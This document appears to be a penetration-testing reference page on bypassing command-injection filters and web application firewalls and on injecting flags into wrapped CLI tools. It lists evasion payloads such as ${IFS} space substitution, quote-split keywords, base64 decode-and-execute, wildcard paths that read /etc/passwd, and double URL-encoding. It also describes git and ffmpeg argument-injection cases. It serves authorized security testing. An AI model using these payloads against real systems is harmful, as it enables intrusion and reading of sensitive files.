# Filter & WAF Bypass, and Argument Injection

## First, diagnose what's blocking you

When a payload that should work gets rejected, figure out *where* the block happens before picking a bypass technique:

```
- Error appears inline in the application's own response/output field
  -> the application itself is filtering (a blocklist in its code)
- Redirected to a generic block page, often showing your IP/request
  details -> a WAF in front of the application is filtering
- Test one character/keyword at a time by removing pieces of your
  payload until it's accepted, to isolate exactly which token triggers
  the block, rather than guessing at the whole bypass blind
```

Most filters are blocklists (a fixed set of blocked characters or keywords), which are inherently incomplete — the goal of every technique below is finding the separator, space, or keyword representation the list's author didn't think of.

## If separators are blocked: try the others first

```
If ; is blocked, try: (newline), |, &&, &, ||
```
Blocklists frequently cover the "obvious" separators (`;`, `&&`) and miss less common ones — always try the full set before reaching for encoding tricks.

## If spaces are blocked

```
Linux:   ${IFS}        (Internal Field Separator, used by the shell
                         itself wherever it would normally see a space)
         $IFS$9         (alternate form that survives some regex filters
                         looking specifically for "${IFS}")
         <>              (redirection operators the shell treats as
                         whitespace-adjacent in certain contexts)
         {cmd,arg1,arg2} (brace expansion — no spaces needed between
                         arguments at all)

Windows: %ProgramFiles:~10,-5%   (environment-variable substring trick
                                   to produce a space character)
```

## If specific characters (like `/` or `;`) are blocked

Linux environment variables already contain many useful characters — extract a single character from an existing variable instead of typing it directly:
```
echo ${PATH:0:1}        # -> /
echo ${LS_COLORS:10:1}  # -> ; on many systems (position varies — test first)

# Used inline to build a path without ever typing a slash:
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

## If keywords (command names) are blocked

```
Quote insertion (breaks string-matching filters without breaking
shell execution, since the shell strips the quotes before running it):
  w'h'o'a'm'i              ->  whoami
  cat /e't'c/p'a's's'w'd   ->  cat /etc/passwd

Case inversion + translate back at runtime:
  tr [A-Z][a-z] <<< WHOAMI

Reverse the string and pipe through rev:
  rev <<< imaohw

Base64-encode the whole command and decode-and-execute at runtime:
  bash <<< $(base64 -d <<< d2hvYW1p)

Wildcards, when you know enough of a path/filename to disambiguate:
  cat /e??/p??s??     # often resolves to /etc/passwd with no literal
                        match against a keyword-based filter
```

If a filter survives all of the above, the practical next step is usually to abandon direct/keyword-based payloads and switch to a blind/OAST approach (`blind-and-oast-techniques.md`) — heavily obfuscated payloads become hard to debug and a clean OAST callback is often faster to get working than a fifth layer of encoding.

## URL/HTTP-level encoding

Test standard URL-encoding of your separator/payload even when the raw character is blocked — some filters inspect the request before decoding, others after; if the WAF decodes before checking but the application decodes again after, double-encoding can occasionally slip through:
```
%3B   (;)
%26   (&)
%7C   (|)
%2520 (double-encoded space)
```

## Argument/flag injection into wrapped CLI tools (when shell metacharacters don't work at all)

A distinct and frequently higher-value bug class from shell injection: even when an application correctly avoids `shell=True`/backtick-style execution (passing arguments as an array, with no shell metacharacter risk at all), if **your input becomes one of the arguments** passed to a real CLI tool, you may be able to inject an entirely new *flag* that tool itself supports — no shell syntax required, because the tool's own argument parser does the work.

```
Pattern to look for: any feature that lets you control a value that
ends up positioned as a command-line argument to a known binary —
a filename, a URL, a version string, a codec name, an output path.

Test by injecting a leading hyphen and a flag that binary documents:
  --help                     (harmless confirmation the flag is
                               reaching the real argument parser)
  -o /path/you/control        (output-redirection flags, if the tool
                               has one, can become arbitrary file write)
  --upload-file / --exec      (tool-specific flags vary enormously —
                               check that specific tool's documented
                               flags once you've confirmed injection)
```

Two real, disclosed examples worth knowing as reference points for what this escalates to: a GitLab search parameter that ended up as a `git` command-line argument was escalated into full remote code execution by injecting Git's own flags (awarded $12,000) rather than any shell metacharacter; and a media server's video-streaming endpoint passed a codec parameter directly into an `ffmpeg` invocation, where injecting ffmpeg's own `-dump_attachment`/`-attach` flags allowed arbitrary file read and write through the media-container attachment mechanism, with no shell injection involved at any point.

**Confirming this is real, not theoretical:** identify the *specific* underlying binary, find that binary's own documented flags (check `--help` or its manual), and demonstrate one concrete capability that flag grants (a file written where you said, a file read back) — "I could add an extra argument" without showing what that argument actually achieved is a lead, not a finding.
